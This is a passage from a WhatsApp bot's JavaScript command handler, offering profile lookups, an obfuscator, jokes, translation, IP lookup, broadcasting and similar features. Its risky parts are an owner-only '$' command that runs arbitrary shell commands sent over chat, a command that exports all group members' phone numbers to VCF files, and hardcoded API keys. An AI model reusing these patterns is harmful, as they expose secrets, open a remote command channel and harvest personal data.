                    if (!text) return reply(`\`Please provide a TikTok username.\`\n*Example:* ${prefix + command} giftedtechke`);

                    await loading();

                    try {
                        const apiUrl = `https://api.giftedtech.my.id/api/stalk/tiktokstalk?apikey=gifted&username=${encodeURIComponent(text)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        if (!json.success || !json.result) {
                            return reply("Failed to fetch TikTok user details. Please check the username and try again.");
                        }

                        const user = json.result.user;
                        const stats = json.result.stats;

                        const message = `*🎥 TikTok User Information*\n\n` +
                            `👤 *Username:* ${user.uniqueId}\n` +
                            `🎭 *Nickname:* ${user.nickname}\n` +
                            `🌎 *Region:* ${user.region || "Unknown"}\n` +
                            `✅ *Verified:* ${user.verified ? "Yes" : "No"}\n\n` +
                            `📄 *Bio:* ${user.signature || "No bio available"}\n` +
                            `🔗 *Profile Link:* [Visit Profile](https://www.tiktok.com/@${user.uniqueId})\n\n` +
                            `📊 *Statistics:*\n` +
                            `👥 *Followers:* ${stats.followerCount || 0}\n` +
                            `🔗 *Following:* ${stats.followingCount || 0}\n` +
                            `❤️ *Likes:* ${stats.heartCount || 0}\n` +
                            `🎥 *Videos:* ${stats.videoCount || 0}`;

                        await conn.sendMessage(from, {
                            image: {
                                url: user.avatarLarger
                            },
                            caption: message,
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in tiktokstalk case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
case 'encrypt':
case 'obfuscate':
case 'hard-encrypt': {
    if (!text) return reply(`\`No JavaScript code detected\`\n*Example:* ${prefix + command} console.log('blue demon');`);

    await loading();

    try {
        const apiUrl = `https://api-x-demon-dev.hf.space/api/obf?code=${encodeURIComponent(text)}`;
        const response = await fetch(apiUrl);

        if (!response.ok) {
            console.error(`API returned status: ${response.status} ${response.message}`);
            return reply("Failed to connect to the obfuscation service. Please try again later.");
        }

        const res = await response.json();

        if (res.status !== 200 || !res.success) {
            console.error(`API error: ${JSON.stringify(res)}`);
            return reply("Failed to obfuscate the provided code. Please ensure the code is valid and try again.");
        }

        const encryptedCode = res.obfuscatedCode;
        const tempFilePath = './blue-enc.js';

        const fs = require('fs');
        fs.writeFileSync(tempFilePath, encryptedCode, 'utf8');

        await conn.sendMessage(m.chat, {
            document: { url: tempFilePath },
            mimetype: 'application/javascript',
            fileName: 'BLUE-ENC.js',
            caption: fontx(`> ${caption}`),
        }, { quoted: m });

        fs.unlinkSync(tempFilePath); // Clean up the temporary file
    } catch (error) {
        console.error("Error in obfuscate case:", error.message || error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
                case 'svcontact': {
                    if (!isGroup) return reply(mess.only.group);
                    if (!isAdmins) return reply(mess.only.admins)
                    await loading();

                    try {
                        const groupMetadata = await conn.groupMetadata(m.chat);
                        const participants = groupMetadata.participants;
                        const groupName = groupMetadata.subject; 
                        const totalContacts = participants.length;
                        const vcfFiles = [];
                        let vcfData = '';
                        let fileCounter = 1;
                        let contactCounter = 0;

                        for (let participant of participants) {
                            const contactNumber = participant.id.split('@')[0];
                            const contactName = participant.notify || participant.id.split('@')[0];
                            vcfData += `BEGIN:VCARD\nVERSION:3.0\nFN:${contactName}\nTEL;type=CELL;type=VOICE;waid=${contactNumber}:${contactNumber}\nEND:VCARD\n\n`;
                            contactCounter++;

                            if (contactCounter % 100 === 0 || participant === participants[participants.length - 1]) {
                                // Save the VCF data to a file
                                const vcfFileName = `./temp/contacts_file_${fileCounter}.vcf`;
                                fs.writeFileSync(vcfFileName, vcfData, 'utf8');
                                vcfFiles.push(vcfFileName);
                                vcfData = ''; // Reset for the next file
                                fileCounter++;
                            }
                        }

                        // Send each VCF file
                        for (let i = 0; i < vcfFiles.length; i++) {
                            const vcfFileName = vcfFiles[i];
                            const caption = `*Contact file ${i + 1}*\n\n*GROUP:* ${groupName}\n*CONTACTS:* ${totalContacts}\n> ${caption}`;
                            await conn.sendMessage(m.chat, {
                                document: {
                                    url: vcfFileName
                                },
                                fileName: `contacts_file_${i + 1}.vcf`,
                                mimetype: 'text/x-vcard',
                                caption
                            }, {
                                quoted: m
                            });
                            fs.unlinkSync(vcfFileName); // Delete the file after sending
                        }
                    } catch (error) {
                        console.error("Error in svcontact case:", error.message || error);
                        reply("An error occurred while processing the contacts. Please try again later.");
                    }
                    break;
                }
                case 'fancy':
                case 'style': {
                    if (!text) return reply(`\`Please provide the text to stylize.\`\n*Example:* ${prefix + command} Blue demon`);

                    await loading();

                    try {
                        const apiUrl = `https://api.giftedtech.my.id/api/tools/fancy?apikey=gifted&text=${encodeURIComponent(text)}`;
                        const response = await fetch(apiUrl);

                        // Check for HTTP errors
                        if (!response.ok) {
                            console.error(`API returned status: ${response.status} ${response.statusText}`);
                            return reply("Failed to connect to the fancy text service. Please try again later.");
                        }

                        const res = await response.json();

                        // Validate API response
                        if (res.status !== 200 || !res.success || !res.results || res.results.length === 0) {
                            return reply("Failed to generate fancy text. Please try again later.");
                        }

                        // Format the stylized text results
                        const styles = res.results
                            .filter(item => item.result.trim()) // Filter out empty results
                            .map((item, index) => `${themeemoji}. ${item.result}`)
                            .join('\n\n');

                        // Send the formatted response
                        await conn.sendMessage(m.chat, {
                            image: {
                                url: './temp/blueimages/fancy.jpg'
                            },
                            caption: `*Fancy Text Generator:*\n${readmore}\n${styles}\n\n> ${caption}`,
                        }, {
                            quoted: m
                        });
                    } catch (error) {
                        console.error("Error in fancy case:", error.message || error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'areact': {
                    if (!isOwner) return reply(mess.only.owner); 
                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); 
                    if (args[0] === 'on') {
                        global.autoreact = true; 
                        await reply('Successfully Activated AutoReact.');
                    } else if (args[0] === 'off') {
                        global.autoreact = false;
                        await reply('Successfully Deactivated AutoReact.');
                    } else {
                        return reply(`Invalid option. Use "on" or "off" to toggle AutoReact.`);
                    }
                    break;
                }
                case 'restart':
                    if (!isOwner) return reply(mess.only.owner)
                    await loading()
                    reply(`*RESTARTING..*`)
                    await sleep(3000)
                    process.exit()
                    break
                case 'ffstalk':
                case 'freefirestalk': {
                    if (!text) return reply(`\`No UID and region detected\`.\n*Example:* ${prefix + command} 6974171054 ME`);

                    await loading();

                    try {
                        const [uid, region] = text.split(' ');
                        if (!uid || !region) {
                            return reply(`Invalid format. Please provide both UID and region.\n\n*Example:* ${prefix + command} 6974171054 ME`);
                        }
                        const apiUrl = `https://garena420ffapi.vercel.app/profile_info?uid=${encodeURIComponent(uid)}&region=${encodeURIComponent(region)}&key=Saidul`;
                        const response = await fetch(apiUrl);
                        const res = await response.json();
                        if (!res.AccountInfo || !res.AccountInfo.AccountName) {
                            return reply("Failed to retrieve the player's data. Please check the UID or region and try again.");
                        }

                        const {
                            AccountInfo,
                            GuildInfo,
                            petInfo,
                            socialinfo
                        } = res;
                        const message = `🎮 *Free Fire Player info*\n\n` +
                            `*🆔 UID:* ${uid}\n` +
                            `*👤 Nickname:* ${AccountInfo.AccountName}\n` +
                            `*🌎 Region:* ${AccountInfo.AccountRegion}\n` +
                            `*📅 Created At:* ${new Date(AccountInfo.AccountCreateTime * 1000).toLocaleString()}\n` +
                            `*🏅 Level:* ${AccountInfo.AccountLevel}\n` +
                            `*❤️ Likes:* ${AccountInfo.AccountLikes}\n` +
                            `*🔥 BR Rank:* ${AccountInfo.BrMaxRank}\n` +
                            `*⚔️ CS Rank:* ${AccountInfo.CsMaxRank}\n` +
                            `*🏠 Guild Name:* ${GuildInfo?.GuildName || "None"}\n` +
                            `*🐾 Pet Name:* ${petInfo?.name || "None"} (Level: ${petInfo?.level || "N/A"})\n` +
                            `*🖊️ Signature:* ${socialinfo?.AccountSignature || "None"}\n` +
                            `\n> ${caption}`;
                        reply(message);
                    } catch (error) {
                        console.error("Error in ffstalk case:", error);
                        reply("An error occurred while retrieving player data. Please try again later.");
                    }
                    break;
                }
                case 'broadcast': {
                    if (!isOwner) return reply(mess.only.owner);

                    if (!text) return reply(`\`No Message detected\`.\n*Example:* ${prefix + command} Hello, this is a broadcast message!`);

                    await loading();

                    try {
                        const groups = Object.values(await conn.groupFetchAllParticipating());
                        if (!groups.length) return reply("You are not part of any groups.");
                        reply(`📢 *Broadcast Preview:*\n\n*Message:* ${text}\n\n*Groups* ${groups.length}\n\n🔃 *Broadcast will start shortly...*`);

                        let successCount = 0;
                        let failCount = 0;

                        for (const group of groups) {
                            try {
                                await conn.sendMessage(group.id, {
                                    text: fontx(`📣 *BROADCAST MESSAGE:* 📣\n\n*Message* ☛ ${text}\n\n> ${caption}`)
                                });
                                successCount++;
                                await sleep(1000);
                            } catch (error) {
                                console.error(`Failed to send message to group ${group.id}:`, error);
                                failCount++;
                            }
                        }

                        reply(`✅ Broadcast completed.\n\n*Success:* ${successCount}\n*Failed:* ${failCount}`);
                    } catch (error) {
                        console.error("Error in broadcast case:", error);
                        reply("An error occurred while broadcasting. Please try again later.");
                    }
                    break;
                }
                case '$': {
                    if (!isOwner) return reply(mess.only.owner)
                    await loading()
                    exec(q, async (err, stdout) => {
                        if (err) return reply(`Error:~ ${err}`);
                        if (stdout) {
                            await reply(`*>_ Console*\n\n${stdout}`);
                        }
                    });
                    break;
                }
                case 'exchange': {
                    if (!args[0] || !args[1] || !args[2]) return reply('`Invalid Input or Format`\n*Example: exchange 100 USD EUR*');
                    await loadingx()
                    const amount = parseFloat(args[0]);
                    const fromCurrency = args[1].toUpperCase();
                    const toCurrency = args[2].toUpperCase();

                    if (isNaN(amount)) return reply('*Please enter a valid amount*.');

                    try {
                        const apiKey = '43f31fb84c391ced11b216a4';
                        const url = `https://v6.exchangerate-api.com/v6/${apiKey}/pair/${fromCurrency}/${toCurrency}`;

                        const response = await axios.get(url);
                        const exchangeRate = response.data.conversion_rate;
                        const convertedAmount = (amount * exchangeRate).toFixed(2);
                        reply(`💱 *CURRENCY EXCHANGE* 💱\n\n*Amount:* *\`${amount} ${fromCurrency}\`*\n*Converted Amount:* *\`${convertedAmount} ${toCurrency}\`*\n*Exchange Rate:* *\`1 ${fromCurrency} = ${exchangeRate} ${toCurrency}\`*
> ${caption}`);
                    } catch (error) {
                        console.error(error);
                        reply('Error: Unable to retrieve exchange rates. Please try again later.');
                    }
                    break;
                }
case 'dare': {
    await loading();
    try {
        const apiUrl = 'https://api-x-demon-dev.hf.space/api/dare';
        const response = await fetch(apiUrl);
        const json = await response.json();
        
        if (json.status !== 200 || !json.success || !json.dare) {
            return conn.sendMessage(m.chat, { text: "Failed to fetch a joke. Please try again later." }, { quoted: m });
        }

        const dareMessage = fontx(`😗 *truth:*\n${json.dare}`)+(`\n\`\`\`https://api-x-demon-dev.hf.space/api/dare\`\`\``)+fontx(`\n> ${caption}`);
        conn.sendMessage(m.chat, { text: dareMessage }, { quoted: m });
        
    } catch (error) {
        console.error("Error in dare case:", error);
        conn.sendMessage(m.chat, { text: "An error occurred while fetching the dare. Please try again later." }, { quoted: m });
    }
    break;
}
case 'truth': {
    await loading();
    try {
        const apiUrl = 'https://api-x-demon-dev.hf.space/api/truth';
        const response = await fetch(apiUrl);
        const json = await response.json();
        
        if (json.status !== 200 || !json.success || !json.truth) {
            return conn.sendMessage(m.chat, { text: "Failed to fetch a joke. Please try again later." }, { quoted: m });
        }

        const truthMessage = fontx(`🤥 *truth:*\n${json.truth}`)+(`\n\`\`\`https://api-x-demon-dev.hf.space/api/truth\`\`\``)+fontx(`\n> ${caption}`);
        conn.sendMessage(m.chat, { text: truthMessage }, { quoted: m });
        
    } catch (error) {
        console.error("Error in jokes case:", error);
        conn.sendMessage(m.chat, { text: "An error occurred while fetching the truth. Please try again later." }, { quoted: m });
    }
    break;
}
                case 'rizz': case 'flirt': {
    await loading();
    try {
        const apiUrl = 'https://api-x-demon-dev.hf.space/api/rizz';
        const response = await fetch(apiUrl);
        const json = await response.json();
        
        if (json.status !== 200 || !json.success || !json.rizz) {
            return conn.sendMessage(m.chat, { text: "Failed to fetch a joke. Please try again later." }, { quoted: m });
        }

        const rizzMessage = fontx(`🥶 *rizz:*\n${json.rizz}`)+(`\n\`\`\`https://api-x-demon-dev.hf.space/api/rizz\`\`\``)+fontx(`\n> ${caption}`);
        conn.sendMessage(m.chat, { text: rizzMessage }, { quoted: m });
        
    } catch (error) {
        console.error("Error in jokes case:", error);
        conn.sendMessage(m.chat, { text: "An error occurred while fetching the rizz. Please try again later." }, { quoted: m });
    }
    break;
}
case 'jokes': {
    await loading();
    try {
        const apiUrl = 'https://api-x-demon-dev.hf.space/api/joke';
        const response = await fetch(apiUrl);
        const json = await response.json();
        
        if (json.status !== 200 || !json.success || !json.joke) {
            return conn.sendMessage(m.chat, { text: "Failed to fetch a joke. Please try again later." }, { quoted: m });
        }

        const jokeMessage = fontx(`🤣 *joke:*\n${json.joke}`)+(`\n\`\`\`https://api-x-demon-dev.hf.space/api/joke\`\`\``)+fontx(`\n> ${caption}`);
        conn.sendMessage(m.chat, { text: jokeMessage }, { quoted: m });
        
    } catch (error) {
        console.error("Error in jokes case:", error);
        conn.sendMessage(m.chat, { text: "An error occurred while fetching the joke. Please try again later." }, { quoted: m });
    }
    break;
}
                case 'npmcheck': {
                    if (!text) return reply(`Please provide the NPM package name.\n\n*Example:* ${prefix + command} yarn`);

                    await loading();
                    try {
                        const apiUrl = `https://api.popcat.xyz/npm?q=${encodeURIComponent(text)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();
                        if (!json.name) {
                            return reply("Package not found or invalid response. Please check the package name.");
                        }
                        const {
                            name,
                            version,
                            description,
                            keywords,
                            author,
                            author_email,
                            last_published,
                            maintainers,
                            repository,
                            downloads_this_year,
                        } = json;

                        // Format the response
                        const npmDetails = `
📦 *Package Name:* ${name}
🔖 *Version:* ${version}
📜 *Description:* ${description}
🔑 *Keywords:* ${keywords || 'N/A'}
👤 *Author:* ${author} (${author_email || 'N/A'})
🗓️ *Last Published:* ${last_published}
🛠️ *Maintainers:* ${maintainers}
🔗 *Repository:* ${repository || 'N/A'}
📥 *Downloads This Year:* ${downloads_this_year || 'N/A'}
        `;

                        // Send the package details as a reply
                        reply(npmDetails.trim());
                    } catch (error) {
                        console.error("Error in npmcheck case:", error);
                        reply("An error occurred while fetching the package details. Please try again later.");
                    }
                    break;
                }
                case 'translate': {
                    if (!args[0]) return reply(`\`Please provide a target language.\`\n*Example: ${prefix + command} en hello*\n*Or reply to a message with: ${prefix + command} en*`);

                    const targetLang = args[0];
                    const textToTranslate = m.quoted?.text || args.slice(1).join(' '); // Check if replying to a message or taking input
                    if (!textToTranslate) return reply(`\`Please provide text to translate or reply to a message.\``);

                    try {
                        await loading();

                        // API call
                        const apiUrl = `https://api.popcat.xyz/translate?to=${encodeURIComponent(targetLang)}&text=${encodeURIComponent(textToTranslate)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        // Validate API response
                        if (!json.translated) {
                            return reply("Failed to translate the text. Please try again later.");
                        }

                        // Send the translated text
                        reply(`*🌐 Translated to ${targetLang.toUpperCase()}:*\n\n${json.translated}`);

                    } catch (error) {
                        console.error("Error in translate case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'encode': {
                    const textToEncode = m.quoted?.text || args.join(' '); // Check if replying to a message or taking input
                    if (!textToEncode) return reply(`\`Please provide text to encode or reply to a message.\`\n*Example: ${prefix + command} hello*`);

                    try {
                        await loading();

                        // API call
                        const apiUrl = `https://api.popcat.xyz/encode?text=${encodeURIComponent(textToEncode)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        // Validate API response
                        if (!json.binary) {
                            return reply("Failed to encode the text. Please try again later.");
                        }

                        // Send the encoded text
                        reply(`*🔢 Encoded Binary:*\n\n${json.binary}`);

                    } catch (error) {
                        console.error("Error in encode case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'decode': {
                    const binaryToDecode = m.quoted?.text || args.join(' '); // Check if replying to a message or taking input
                    if (!binaryToDecode) return reply(`\`Please provide binary code to decode or reply to a message.\`\n*Example: ${prefix + command} 01101101111*`);

                    try {
                        await loading();

                        // API call
                        const apiUrl = `https://api.popcat.xyz/decode?binary=${encodeURIComponent(binaryToDecode)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        // Validate API response
                        if (!json.text) {
                            return reply("Failed to decode the binary. Please ensure the input is valid binary and try again.");
                        }

                        // Send the decoded text
                        reply(`*🔤 Decoded Text:*\n\n${json.text}`);

                    } catch (error) {
                        console.error("Error in decode case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'owner':
                case 'creator':
                case 'dev': {
                    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender;
                    let pp = await conn.profilePictureUrl(who).catch(_ => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60');
                    let name = await conn.getName(who);

                    await conn.sendContactArray(m.chat, [
                        [`2347041039367@s.whatsapp.net`, `BLUE DEMON`, `Bot Developer`, `Feel free to contact me for assistance or inquiries.`]
                    ], m);

                    await reply(`Hello 👋, if you wish to contact the owner, please use the provided contact details.`);
                }
                break;
case 'script':
case 'repo':
case 'sc': {
    try {
        await loading();

        await conn.sendMessage(m.chat, {
            image: { url: 'https://huggingface.co/spaces/API-X/BOT-BASE/resolve/main/menu1.jpg' },
            caption: fontx(`sending script a sec👀`)
        });

        // URL to download the ZIP file
        const zipUrl = 'https://github.com/BLUEXDEMONl/BLUEXDEMON-V5/archive/refs/heads/master.zip';

        const response = await fetch(zipUrl);

        if (!response.ok) {
            return reply(`*Failed to download the repository.*\nReason: ${response.statusText}`);
        }

        const zipBuffer = await response.buffer();

        // Send the ZIP file
        await conn.sendMessage(m.chat, {
            document: zipBuffer,
            mimetype: 'application/zip',
            fileName: '𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽-𝚅𝟻.zip',
            caption: `*REPO LINK*: https://github.com/BLUEXDEMONl/BLUEXDEMON-V5.git\n*CHANNEL*: https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h`,
        }, { quoted: m });

    } catch (e) {
        console.error('Error in script case:', e);
        reply('An error occurred while fetching the script. Please try again later.');
    }
    break;
}
                case 'alive':
                case 'scan': {
                    try {
                        await loading()
                        const animations = [
                            `💻 *System Check Initiated...*\n> ${caption}`,
                            `🔄 *Loading Modules...*\n> ${caption}`,
                            `✅ *Module: Messaging [OK]*`,
                            `✅ *Module: Connectivity [OK]*`,
                            `✅ *Module: AI Responses [OK]*`,
                            `🔍 *Scanning for Updates...*`,
                            `🛠️ *Update: No Updates Available*`,
                            `🔄 *System Optimization: 87% Complete...*`,
                            `✅ *System Optimization: Complete*`,
                            `📡 *Establishing Secure Connection...*`,
                            `✅ *Connection Established Successfully*`,
                            `🚀 *Ready for Commands!*\n> ${caption}`,
                        ];

                        // Send the first animation stage
                        const initialMessage = await conn.sendMessage(m.chat, {
                            text: animations[0],
                        }, {
                            quoted: m
                        });

                        // Animate by editing the message every 2 seconds
                        let currentIndex = 1; // Start from the second stage
                        const animationInterval = setInterval(async () => {
                            if (currentIndex >= animations.length) {
                                clearInterval(animationInterval); // Stop after completing the animation
                            } else {
                                try {
                                    await conn.sendMessage(m.chat, {
                                        edit: initialMessage.key,
                                        text: animations[currentIndex],
                                    });
                                    currentIndex++;
                                } catch (err) {
                                    console.error("Error editing alive animation:", err);
                                    clearInterval(animationInterval); // Stop on error
                                }
                            }
                        }, 2000); // Change text every 2 seconds
                    } catch (err) {
                        console.error("Error in alive case:", err);
                        reply("An error occurred while processing your request.");
                    }
                    break;
                }
                case 'pickuplines':
              case 'rizz': {
    try {
        await loading();

        // Fetch a pickup line from the new API
        let res = await fetch(`https://api.popcat.xyz/pickuplines`);
        let json = await res.json();

        // Check if the response is valid
        if (!json.pickupline) {
            return reply("Failed to fetch a pickup line. Please try again later.");
        }

        // Send the pickup line
        await reply(`💌 *Pickup Line:*\n${json.pickupline}`);
    } catch (error) {
        console.error("Error in pickuplines case:", error);
        reply("An error occurred while fetching a pickup line. Please try again later.");
    }
    break;
}
                case 'listonline': {
                    if (!isGroup) return reply(mess.only.group); // Check if the command is used in a group
                    if (!isAdmins && !isOwner) return reply(mess.only.admin); // Check if the user is an admin or owner

                    // Check if a specific group ID is provided, else use the current group
                    let id = args && /\d+-\d+@g.us/.test(args[0]) ? args[0] : from;

                    // Retrieve the list of online members in the group, including the bot number
                    let online = [...Object.keys(store.presences[id]), botNumber];

                    // Construct the online list message
                    let onlineListMessage = 'List Online:\n\n' + online
                        .map(v => `${themeemoji} @${v.replace(/@.+/, '')}`) // Format each online user
                        .join('\n'); // Join the formatted online users into a single string

                    // Send the formatted list to the group with mentions
                    await conn.sendText(from, onlineListMessage, m, {
                        mentions: online
                    });
                }
                break;

                case 'pinterest': {
                    if (!q) return reply(`\`No search query detected\`.\n*Example: ${prefix + command} beautiful landscapes*`);

                    await loading(); // Show loading message

                    try {
                        // API endpoint with the encoded query
                        const apiUrl = `https://www.bhandarimilan.info.np/pinterest?query=${encodeURIComponent(q)}`;

                        // Fetch response from the API
                        const response = await fetch(apiUrl);
                        const data = await response.json();

                        // Validate the response
                        if (!data || data.data.length === 0) {
                            return reply("No results found. Please try with a different query.");
                        }

                        // Get the first five images
                        const images = data.data.slice(0, 5);

                        // Send the images one by one
                        for (let url of images) {
                            await conn.sendMessage(m.chat, {
                                image: {
                                    url
                                },
                                caption: fontx(`🔗 *Pinterest Result*\n${q}\n> ${caption}`)
                            }, {
                                quoted: m
                            });
                        }
                    } catch (error) {
                        console.error("Error in Pinterest case:", error);
                        reply("An error occurred while fetching Pinterest results. Please try again later.");
                    }
                    break;
                }
                case 'checkcolor':
                case 'color': {
                    if (!q) return reply(`\`Provide a hex color code\`.\n*Example: ${prefix + command} ffcc99*`);

                    await loading(); // Show loading message

                    try {
                        // API endpoint
                        const apiUrl = `https://api.popcat.xyz/color/${encodeURIComponent(q)}`;

                        // Fetch response from the API
                        const response = await fetch(apiUrl);
                        const data = await response.json();

                        // Validate the response
                        if (!data || !data.hex) {
                            return reply("Invalid color code or no data found. Please check your input.");
                        }

                        // Extract details
                        const {
                            hex,
                            name,
                            rgb,
                            color_image,
                            brightened
                        } = data;

                        // Send the color details
                        await conn.sendMessage(m.chat, {
                            image: {
                                url: color_image
                            },
                            caption: fontx(`🎨 *Color Details*\n\n🔹 *Hex Code*: ${hex}\n🔹 *Name*: ${name}\n🔹 *RGB*: ${rgb}\n🔹 *Brightened Hex*: ${brightened}\n\n> ${caption}`),
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in checkcolor case:", error);
                        reply("An error occurred while fetching color details. Please try again later.");
                    }
                    break;
                }
                case 'element': {
                    if (!q) return reply(`\`provide an element name/symbol\`.\nExample: ${prefix + command} bohrium`);

                    await loading(); // Show loading message

                    try {
                        // API endpoint
                        const apiUrl = `https://api.popcat.xyz/periodic-table?element=${encodeURIComponent(q)}`;

                        // Fetch response from the API
                        const response = await fetch(apiUrl);
                        const data = await response.json();

                        // Validate the response
                        if (!data || !data.name) {
                            return reply("Invalid element name or symbol. Please check your input.");
                        }

                        // Extract details
                        const {
                            name,
                            symbol,
                            atomic_number,
                            atomic_mass,
                            period,
                            phase,
                            discovered_by,
                            image,
                            summary
                        } = data;

                        // Send the element details
                        await conn.sendMessage(m.chat, {
                            image: {
                                url: image
                            },
                            caption: fontx(`🧪 *Periodic Table Element*\n${readmore}\n🔹 *Name*: ${name}\n🔹 *Symbol*: ${symbol}\n🔹 *Atomic Number*: ${atomic_number}\n🔹 *Atomic Mass*: ${atomic_mass}\n🔹 *Period*: ${period}\n🔹 *Phase*: ${phase}\n🔹 *Discovered By*: ${discovered_by}\n\n📘 *Summary*: ${summary}\n> ${caption}`),
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in elements case:", error);
                        reply("An error occurred while fetching element details. Please try again later.");
                    }
                    break;
                }
                case 'randomcolor': {
                    await loading(); // Show loading message

                    try {
                        // API endpoint
                        const apiUrl = `https://api.popcat.xyz/randomcolor`;

                        // Fetch response from the API
                        const response = await fetch(apiUrl);
                        const data = await response.json();

                        // Validate the response
                        if (!data || !data.hex || !data.name) {
                            return reply("Failed to fetch a random color. Please try again later.");
                        }

                        // Extract details
                        const {
                            hex,
                            name,
                            image
                        } = data;

                        // Send the random color details
                        await conn.sendMessage(m.chat, {
                            image: {
                                url: image
                            },
                            caption: font(`🎨 *Random Color*\n\n🔹 *Name*: ${name}\n🔹 *HEX*: #${hex}\n\n> ${caption}`),
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in randomcolor case:", error);
                        reply("An error occurred while fetching a random color. Please try again later.");
                    }
                    break;
                }
                case 'jid':
                case 'getjid': {
                    reply(from)
                }
                break
                case 'checkip': {
                    if (!q) return reply(`\`Please provide an IP address.\`\n*Example: .checkip 8.8.8.8*`);
                    await loading()
                    try {
                        // API Endpoint
                        const apiUrl = `https://ipinfo.io/${encodeURIComponent(q)}/json?token=022a73cf539237`;

                        // Fetch IP information
                        const response = await fetchJson(apiUrl);

                        if (!response || response.error) {
                            return reply("Failed to fetch IP information. Please check the IP address and try again.");
                        }

                        // Destructure relevant data
                        const {
                            ip,
                            hostname,
                            city,
                            region,
                            country,
                            loc,
                            postal,
                            timezone,
                            asn,
                            company,
                            privacy,
                            abuse,
                            domains,
                        } = response;

                        // Prepare the detailed reply
                        const replyMessage = `*IP Information*\n\n` +
                            `❖ *IP:* ${ip || 'N/A'}\n` +
                            `❖ *Hostname:* ${hostname || 'N/A'}\n` +
                            `❖ *City:* ${city || 'N/A'}\n` +
                            `❖ *Region:* ${region || 'N/A'}\n` +
                            `❖ *Country:* ${country || 'N/A'}\n` +
                            `❖ *Location (Lat, Long):* ${loc || 'N/A'}\n` +
                            `❖ *Postal Code:* ${postal || 'N/A'}\n` +
                            `❖ *Timezone:* ${timezone || 'N/A'}\n` +
                            `❖ *ASN:* ${asn?.asn || 'N/A'}\n` +
                            `❖ *ASN Name:* ${asn?.name || 'N/A'}\n` +
                            `❖ *ASN Domain:* ${asn?.domain || 'N/A'}\n` +
                            `❖ *Company Name:* ${company?.name || 'N/A'}\n` +
                            `❖ *Company Domain:* ${company?.domain || 'N/A'}\n` +
                            `❖ *VPN:* ${privacy?.vpn ? 'Yes' : 'No'}\n` +
                            `❖ *Proxy:* ${privacy?.proxy ? 'Yes' : 'No'}\n` +
                            `❖ *TOR:* ${privacy?.tor ? 'Yes' : 'No'}\n` +
                            `❖ *Relay:* ${privacy?.relay ? 'Yes' : 'No'}\n` +
                            `❖ *Abuse Contact Name:* ${abuse?.name || 'N/A'}\n` +
                            `❖ *Abuse Contact Email:* ${abuse?.email || 'N/A'}\n` +
                            `❖ *Abuse Contact Phone:* ${abuse?.phone || 'N/A'}\n` +
                            `❖ *Domains Linked:* ${domains?.total || 'N/A'}\n` +
                            `❖ *Example Domains:* ${(domains?.domains || []).slice(0, 5).join(', ') || 'N/A'}\n`;

                        // Send the detailed response
                        reply(replyMessage);
                    } catch (error) {
                        console.error("Error in checkip case:", error);
                        reply("An error occurred while fetching the IP information. Please try again later.");
                    }
                    break;
                }
                case 'ss':
                case 'ssweb': {
                    if (!q) return reply("Please provide a valid URL.\n*Example:* `.ss https://example.com`");
                    await loading()
                    if (!isUrl(args[0]) && !args[0].includes('www.')) return reply("Invalid URL. Please provide a valid website link.");

                    // Generate screenshot URL using API
                    const Url = `https://api.apiflash.com/v1/urltoimage?access_key=b04fa07f69b348dcb7b06730177eb54e&wait_until=page_loaded&url=${q}`;

                    // Send the screenshot as an image
                    try {
                        await conn.sendMessage(from, {
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: `${botName}`, // Bot Name as title
                                    mediaType: 3,
                                    renderLargerThumbnail: false,
                                    thumbnail: thumb, // Provide your thumbnail image
                                    sourceUrl: `https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h` // Owner's WhatsApp link
                                }
                            },
                            image: {
                                url: Url
                            }, // URL of the generated screenshot
                            caption: font(`${mess.success}\n\n> ${caption}`)
                        }, {
                            quoted: m
                        });
                    } catch (err) {
                        console.error("Error in ss case:", err);
                        reply("The server encountered an error. Please try again later.");
                    }
                    break;
                }
                case 'shorten': case 'tinyurl': {
                    if (!q) return reply("Please provide a URL to shorten.");
                    await loading()
                    // API URL with dynamic URL encoding
                    const apiUrl = `https://tinyurl.com/api-create.php?url=${encodeURIComponent(q)}`;

                    try {
                        // Fetch shortened URL from TinyURL API
                        const response = await fetch(apiUrl);
                        const shortenedUrl = await response.text();

                        if (response.ok) {
                            // Reply with the shortened URL
                            reply(`\`Here is your shortened URL:\` *${shortenedUrl}*`);
                        } else {
                            reply("Failed to shorten the URL. Please try again later.");
                        }
                    } catch (error) {
                        console.error("Error shortening URL:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'readchat':
                case 'autoreadchat':
                case 'autoread': {
                    if (!isOwner) return reply(mess.only.owner); // Check if the user is the owner

                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.autoReadChat = true; // Enable auto react
                        await reply('`Successfully Activated Autoreadchat.`');
                    } else if (args[0] === 'off') {
                        global.autoReadChat = false; // Disable auto react
                        await reply('`Successfully Deactivated Autoreadchat.`');
                    } else {
                        return reply(`\`Invalid option. Use "on" or "off" to toggle Autoreadchat.\``);
                    }
                    break;
                }
                case 'anticall': {
                    if (!isOwner) return reply(mess.only.owner); // Check if the user is the owner

